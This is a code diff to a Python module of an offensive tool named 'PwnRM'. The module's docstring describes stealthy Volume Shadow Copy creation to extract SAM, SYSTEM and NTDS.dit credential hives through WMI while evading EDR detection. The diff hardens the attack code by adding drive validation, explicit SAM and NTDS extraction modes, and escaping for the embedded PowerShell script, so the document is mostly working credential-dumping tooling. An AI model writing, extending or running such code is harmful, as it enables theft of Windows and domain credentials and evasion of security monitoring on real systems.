@@ -3,6 +3,7 @@ modules.vss — In-Memory Volume Shadow Copy Service (VSS) Extraction
 Performs stealthy Volume Shadow Copy creation and registry/NTDS extraction via WMI/CIM reflection without calling vssadmin.exe or ntdsutil.exe (bypassing EDR heuristics).
 """
 
+import re
 from typing import List, Any
 from . import BaseModule
 from ..shell.ui import c, R, G, Y, B, M, C, DIM, BLD, RST
@@ -17,7 +18,7 @@ class VSSModule(BaseModule):
         "--drive": {"desc": "Target drive letter (default: C:)"},
         "--sam": {"desc": "Extract SAM and SYSTEM hives to temporary staging path"},
         "--ntds": {"desc": "Extract active NTDS.dit and SYSTEM hive (Domain Controllers)"},
-        "--clean": {"desc": "Enforce immediate cleanup of all created shadow copies"},
+        "--clean": {"desc": "Compatibility flag; created shadow copies are always deleted"},
     }
 
     def run(self, shell, args: List[str]) -> Any:
@@ -28,8 +29,20 @@ class VSSModule(BaseModule):
                 if not drive.endswith(":"):
                     drive += ":"
 
-        extract_ntds = "--ntds" in args
-        clean_only = "--clean" in args
+        if not re.fullmatch(r"[A-Z]:", drive):
+            shell.write_error("  [-] Invalid VSS drive. Expected a drive letter such as C:.")
+            return {"status": "error", "reason": "invalid_drive"}
+
+        normalized_args = {arg.lower() for arg in args}
+        request_ntds = bool(normalized_args & {"ntds", "--ntds"})
+        request_sam = bool(normalized_args & {"sam", "--sam"})
+        if request_ntds and request_sam:
+            shell.write_error("  [-] Choose either SAM or NTDS extraction, not both.")
+            return {"status": "error", "reason": "conflicting_modes"}
+
+        requested_mode = "ntds" if request_ntds else "sam" if request_sam else "auto"
+        drive_ps = shell._pse(drive)
+        requested_mode_ps = shell._pse(requested_mode)
 
         shell.write_info(c(M + BLD, f"  [*] PwnRM VSS Engine — initializing WMI-based shadow copy operations on {drive}..."))
 
@@ -39,9 +52,14 @@ Write-Host "`n========================================================" -Foregro
 Write-Host "   PwnRM In-Memory VSS Extraction & Credential Hives" -ForegroundColor Cyan
 Write-Host "========================================================`n" -ForegroundColor Cyan
 
-$drive = '{drive}\\'
+$drive = '{drive_ps}\\'
+$requestedMode = '{requested_mode_ps}'
 $isDC = (Get-WmiObject Win32_ComputerSystem).DomainRole -ge 4
-$targetHive = if ({str(extract_ntds).lower()} -or $isDC) {{ "NTDS.dit" }} else {{ "SAM" }}
+$targetHive = switch ($requestedMode) {{
+    "ntds" {{ "NTDS.dit" }}
+    "sam"  {{ "SAM" }}
+    default {{ if ($isDC) {{ "NTDS.dit" }} else {{ "SAM" }} }}
+}}
 
 Write-Host "  [*] Target Volume : $drive" -ForegroundColor White
 Write-Host "  [*] Target Mode   : $targetHive extraction" -ForegroundColor Gray
